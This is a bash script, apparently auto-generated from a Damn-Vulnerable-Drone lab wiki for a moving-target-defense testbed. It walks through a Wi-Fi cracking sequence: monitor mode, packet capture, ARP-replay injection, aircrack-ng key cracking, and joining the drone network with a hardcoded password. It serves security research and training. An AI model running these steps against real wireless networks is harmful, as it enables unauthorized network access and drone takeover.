#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Wifi-Analysis-&-Cracking.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition & Logging Setup
# ==========================================================
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../..")

# --- Python Module Path FIX ---
# 파이썬이 우리 모듈을 찾을 수 있도록 프로젝트 루트를 PYTHONPATH에 추가합니다.
export PYTHONPATH="${PROJECT_ROOT}:${PYTHONPATH}"

# MTD 타겟 조회
pushd "$PROJECT_ROOT" > /dev/null
# MTD 인터페이스 모듈 직접 실행
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
POP_RESULT=$?
popd > /dev/null

if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

TARGET_IP=$(echo "$TARGET_ADDR" | cut -d: -f1)
TARGET_PORT=14550 # SITL의 기본 UDP 포트

# 중앙 로거 함수 정의
log() {
    printf '[%(%F_T)T] %s\n' -1 "$*"
    EVENT_TYPE=$1
    shift
    EVENT_DATA_STR="$*"
    pushd "$PROJECT_ROOT" > /dev/null
    python3 -c 'from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; import sys; log_bus_event(sys.argv[1], {"message": sys.argv[2]})' "$EVENT_TYPE" "$EVENT_DATA_STR"
    popd > /dev/null
}
# MTD_INTERFACE_END
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
fi

log "[ATTACK] id=wifi-analysis-_-cracking src=Wifi-Analysis-&-Cracking.md"
log "[BLOCK 1] type=shell"
sudo airodump-ng wlan0mon

log "[BLOCK 2] type=shell"
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

log "[BLOCK 3] type=shell"
sudo airmon-ng start wlan0

log "[BLOCK 4] type=shell"
sudo airodump-ng -c 6 --bssid 02:00:00:00:01:00 -w capture wlan0mon

log "[BLOCK 5] type=shell"
sudo aireplay-ng --arpreplay -b 02:00:00:00:01:00 -h 02:00:00:00:02:00 wlan0mon

log "[BLOCK 6] type=shell"
sudo aircrack-ng capture-01.cap

log "[BLOCK 7] type=shell"
nmcli dev wifi connect "Drone_Wifi" password "1234567890"

log "[BLOCK 8] type=shell"
ifconfig wlan3

